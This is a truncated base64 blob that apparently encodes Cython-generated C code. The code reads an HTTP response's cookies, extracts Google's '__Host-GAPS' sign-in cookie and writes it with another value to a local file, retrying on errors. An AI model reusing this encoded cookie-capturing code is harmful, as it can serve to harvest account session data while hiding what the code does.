vZGVfU3BsaXQoKChQeU9iamVjdCopX19weXhfdF8xMiksIF9fUHl4X05vbmVBc051bGwoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9udWxsKSwgLTFMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTcwLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDtcbiAgICAgIF9fcHl4X3RfMTIgPSBfX1B5eF9HZXRJdGVtSW50X0xpc3QoX19weXhfdF82LCAxLCBsb25nLCAxLCBfX1B5eF9QeUxvbmdfRnJvbV9sb25nLCAxLCAwLCAxLCAxKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEyKSkgX19QWVhfRVJSKDAsIDE3MCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMik7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgIF9fcHl4X3RfNCA9IF9fcHl4X3RfMTI7XG4gICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF80KTtcbiAgICAgIF9fcHl4X3RfOSA9IDA7XG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzZ9O1xuICAgICAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3BsaXQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDItX19weXhfdF85KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7XG4gICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDE3MCwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpO1xuICAgICAgfVxuICAgICAgX19weXhfdF8xMiA9IF9fUHl4X0dldEl0ZW1JbnQoX19weXhfdF83LCAwLCBsb25nLCAxLCBfX1B5eF9QeUxvbmdfRnJvbV9sb25nLCAwLCAwLCAxLCAxKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEyKSkgX19QWVhfRVJSKDAsIDE3MCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMik7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICAgIF9fcHl4X3ZfdGwgPSBfX3B5eF90XzEyO1xuICAgICAgX19weXhfdF8xMiA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3Jlc3BvbnNlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY29va2llcyk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDE3MSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgIF9fcHl4X3RfNyA9IF9fcHl4X3RfNDtcbiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzcpO1xuICAgICAgX19weXhfdF85ID0gMDtcbiAgICAgIHtcbiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNywgTlVMTH07XG4gICAgICAgIF9fcHl4X3RfMTIgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0X2RpY3QsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDEtX19weXhfdF85KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTIpKSBfX1BZWF9FUlIoMCwgMTcxLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTIpO1xuICAgICAgfVxuICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRGljdF9HZXRJdGVtKF9fcHl4X3RfMTIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfSG9zdF9HQVBTKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTcxLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDtcbiAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdl9ob3N0LCBfX3B5eF90XzQpO1xuICAgICAgX19weXhfdF80ID0gMDtcblxuICAgICAgXG4gICAgICAge1xuICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoMSk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDE3MiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZW5jb2RpbmcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfdXRmXzgpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTcyLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19weXhfdF8xMiA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfYnVpbHRpbl9vcGVuLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs0XSwgX19weXhfdF80KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEyKSkgX19QWVhfRVJSKDAsIDE3MiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEyKTtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICAgIF9fcHl4X3RfMTMgPSBfX1B5eF9QeU9iamVjdF9Mb29rdXBTcGVjaWFsKF9fcHl4X3RfMTIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9leGl0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEzKSkgX19QWVhfRVJSKDAsIDE3MiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEzKTtcbiAgICAgICAgX19weXhfdF83ID0gTlVMTDtcbiAgICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfTG9va3VwU3BlY2lhbChfX3B5eF90XzEyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZW50ZXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxNzIsIF9fcHl4X0w5X2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgICAgX19weXhfdF85ID0gMTtcbiAgICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgICAgICBpZiAobGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNikpKSB7XG4gICAgICAgICAgX19weXhfdF83ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF82KTtcbiAgICAgICAgICBhc3NlcnQoX19weXhfdF83KTtcbiAgICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNik7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNyk7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzYsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgICAgX19weXhfdF85ID0gMDtcbiAgICAgICAgfVxuICAgICAgICAjZW5kaWZcbiAgICAgICAge1xuICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzcsIE5VTEx9O1xuICAgICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF85LCAoMS1fX3B5eF90XzkpIHwgKF9fcHl4X3RfOSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTcyLCBfX3B5eF9MOV9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgICAgfVxuICAgICAgICBfX3B5eF90XzYgPSBfX3B5eF90XzQ7XG4gICAgICAgIF9fcHl4X3RfNCA9IDA7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7XG4gICAgICAgICB7XG4gICAgICAgICAge1xuICAgICAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnblxuICAgICAgICAgICAgX19QeXhfRXhjZXB0aW9uU2F2ZSgmX19weXhfdF8xNCwgJl9fcHl4X3RfMTUsICZfX3B5eF90XzE2KTtcbiAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xNCk7XG4gICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTUpO1xuICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE2KTtcbiAgICAgICAgICAgICB7XG4gICAgICAgICAgICAgIF9fcHl4X3ZfZiA9IF9fcHl4X3RfNjtcbiAgICAgICAgICAgICAgX19weXhfdF82ID0gMDtcblxuICAgICAgICAgICAgICBcbiAgICAgICAgICAgICAgX19weXhfdF8xMiA9IF9fcHl4X3ZfZjtcbiAgICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTIpO1xuICAgICAgICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdl90bCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDE3MywgX19weXhfTDEzX2Vycm9yKVxuICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgICAgICAgICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3ZfaG9zdCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDE3MywgX19weXhfTDEzX2Vycm9yKVxuICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICAgICAgICAgICAgX19weXhfdF8xN1swXSA9IF9fcHl4X3RfNDtcbiAgICAgICAgICAgICAgX19weXhfdF8xN1sxXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzc7XG4gICAgICAgICAgICAgIF9fcHl4X3RfMTdbMl0gPSBfX3B5eF90Xzc7XG4gICAgICAgICAgICAgIF9fcHl4X3RfMTdbM10gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X184O1xuICAgICAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeVVuaWNvZGVfSm9pbihfX3B5eF90XzE3LCA0LCBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzQpICsgMiArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfNykgKyAxLCAxMjcgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF80KSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzcpKTtcbiAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTczLCBfX3B5eF9MMTNfZXJyb3IpXG4gICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICAgICAgICAgIF9fcHl4X3RfOSA9IDA7XG4gICAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMiwgX19weXhfdF81fTtcbiAgICAgICAgICAgICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfd3JpdGUsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDItX19weXhfdF85KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwO1xuICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDE3MywgX19weXhfTDEzX2Vycm9yKVxuICAgICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuXG4gICAgICAgICAgICAgIFxuICAgICAgICAgICAgfVxuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE0KTsgX19weXhfdF8xNCA9IDA7XG4gICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTUpOyBfX3B5eF90XzE1ID0gMDtcbiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwO1xuICAgICAgICAgICAgZ290byBfX3B5eF9MMThfdHJ5X2VuZDtcbiAgICAgICAgICAgIF9fcHl4X0wxM19lcnJvcjo7XG4gICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJqcS50bGwiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTtcbiAgICAgICAgICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF82LCAmX19weXhfdF81LCAmX19weXhfdF8xMikgPCAwKSBfX1BZWF9FUlIoMCwgMTcyLCBfX3B5eF9MMTVfZXhjZXB0X2Vycm9yKVxuICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEyKTtcbiAgICAgICAgICAgICAgX19weXhfdF83ID0gUHlUdXBsZV9QYWNrKDMsIF9fcHl4X3RfNiwgX19weXhfdF81LCBfX3B5eF90XzEyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMTcyLCBfX3B5eF9MMTVfZXhjZXB0X2Vycm9yKVxuICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICAgICAgICAgICAgX19weXhfdF8xOCA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF8xMywgX19weXhfdF83LCBOVUxMKTtcbiAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTMpOyBfX3B5eF90XzEzID0gMDtcbiAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7XG4gICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xOCkpIF9fUFlYX0VSUigwLCAxNzIsIF9fcHl4X0wxNV9leGNlcHRfZXJyb3IpXG4gICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE4KTtcbiAgICAgICAgICAgICAgX19weXhfdF8xOSA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzE4KTtcbiAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTgpOyBfX3B5eF90XzE4ID0gMDtcbiAgICAgICAgICAgICAgaWYgKF9fcHl4X3RfMTkgPCAoMCkpIF9fUFlYX0VSUigwLCAxNzIsIF9fcHl4X0wxNV9leGNlcHRfZXJyb3IpXG4gICAgICAgICAgICAgIF9fcHl4X3RfMjAgPSAoIV9fcHl4X3RfMTkpO1xuICAgICAgICAgICAgICBpZiAodW5saWtlbHkoX19weXhfdF8yMCkpIHtcbiAgICAgICAgICAgICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X3RfNik7XG4gICAgICAgICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzUpO1xuICAgICAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTIpO1xuICAgICAgICAgICAgICAgIF9fUHl4X0VyclJlc3RvcmVXaXRoU3RhdGUoX19weXhfdF82LCBfX3B5eF90XzUsIF9fcHl4X3RfMTIpO1xuICAgICAgICAgICAgICAgIF9fcHl4X3RfNiA9IDA7ICBfX3B5eF90XzUgPSAwOyAgX19weXhfdF8xMiA9IDA7IFxuICAgICAgICAgICAgICAgIF9fUFlYX0VSUigwLCAxNzIsIF9fcHl4X0wxNV9leGNlcHRfZXJyb3IpXG4gICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwO1xuICAgICAgICAgICAgICBnb3RvIF9fcHl4X0wxNF9leGNlcHRpb25faGFuZGxlZDtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIF9fcHl4X0wxNV9leGNlcHRfZXJyb3I6O1xuICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNCk7XG4gICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE1KTtcbiAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTYpO1xuICAgICAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xNCwgX19weXhfdF8xNSwgX19weXhfdF8xNik7XG4gICAgICAgICAgICBnb3RvIF9fcHl4X0wzX2Vycm9yO1xuICAgICAgICAgICAgX19weXhfTDE0X2V4Y2VwdGlvbl9oYW5kbGVkOjtcbiAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTQpO1xuICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNSk7XG4gICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE2KTtcbiAgICAgICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMTQsIF9fcHl4X3RfMTUsIF9fcHl4X3RfMTYpO1xuICAgICAgICAgICAgX19weXhfTDE4X3RyeV9lbmQ6O1xuICAgICAgICAgIH1cbiAgICAgICAgfVxuICAgICAgICAge1xuICAgICAgICAgIHtcbiAgICAgICAgICAgIGlmIChfX3B5eF90XzEzKSB7XG4gICAgICAgICAgICAgIF9fcHl4X3RfMTYgPSBfX1B5eF9QeU9iamVjdF9DYWxsKF9fcHl4X3RfMTMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzVdLCBOVUxMKTtcbiAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTMpOyBfX3B5eF90XzEzID0gMDtcbiAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE2KSkgX19QWVhfRVJSKDAsIDE3MiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE2KTtcbiAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTYpOyBfX3B5eF90XzE2ID0gMDtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIGdvdG8gX19weXhfTDEyO1xuICAgICAgICAgIH1cbiAgICAgICAgICBfX3B5eF9MMTI6O1xuICAgICAgICB9XG4gICAgICAgIGdvdG8gX19weXhfTDIyO1xuICAgICAgICBfX3B5eF9MOV9lcnJvcjo7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEzKTsgX19weXhfdF8xMyA9IDA7XG4gICAgICAgIGdvdG8gX19weXhfTDNfZXJyb3I7XG4gICAgICAgIF9fcHl4X0wyMjo7XG4gICAgICB9XG5cbiAgICAgIFxuICAgIH1cbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICBnb3RvIF9fcHl4X0w4X3RyeV9lbmQ7XG4gICAgX19weXhfTDNfZXJyb3I6O1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7XG5cbiAgICBcbiAgICBfX3B5eF90XzIxID0gX19QeXhfUHlFcnJfRXhjZXB0aW9uTWF0Y2hlcygoKFB5T2JqZWN0ICopKCgoUHlUeXBlT2JqZWN0KilQeUV4Y19FeGNlcHRpb24pKSkpO1xuICAgIGlmIChfX3B5eF90XzIxKSB7XG4gICAgICBfX1B5eF9BZGRUcmFjZWJhY2soImpxLnRsbCIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF8xMiwgJl9fcHl4X3RfNSwgJl9fcHl4X3RfNikgPCAwKSBfX1BZWF9FUlIoMCwgMTc0LCBfX3B5eF9MNV9leGNlcHRfZXJyb3IpXG4gICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTIpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzYpO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7XG4gICAgICBfX3B5eF92X2UgPSBfX3B5eF90XzU7XG4gICAgICAge1xuXG4gICAgICAgIFxuICAgICAgICBfX3B5eF90XzQgPSBOVUxMO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9wcmludCk7XG4gICAgICAgIF9fcHl4X3RfMTAgPSBfX3B5eF9idWlsdGluX3ByaW50OyBcbiAgICAgICAgX19weXhfdF85ID0gMTtcbiAgICAgICAge1xuICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzQsIF9fcHl4X3ZfZX07XG4gICAgICAgICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8xMCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF85LCAoMi1fX3B5eF90XzkpIHwgKF9fcHl4X3RfOSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAxNzUsIF9fcHl4X0wyOF9lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTtcbiAgICAgICAgfVxuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcblxuICAgICAgICBcbiAgICAgICAgX19weXhfdF8xMCA9IE5VTEw7XG4gICAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGxsKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTc2LCBfX3B5eF9MMjhfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgICBfX3B5eF90XzkgPSAxO1xuICAgICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzQpKSkge1xuICAgICAgICAgIF9fcHl4X3RfMTAgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzQpO1xuICAgICAgICAgIGFzc2VydChfX3B5eF90XzEwKTtcbiAgICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRo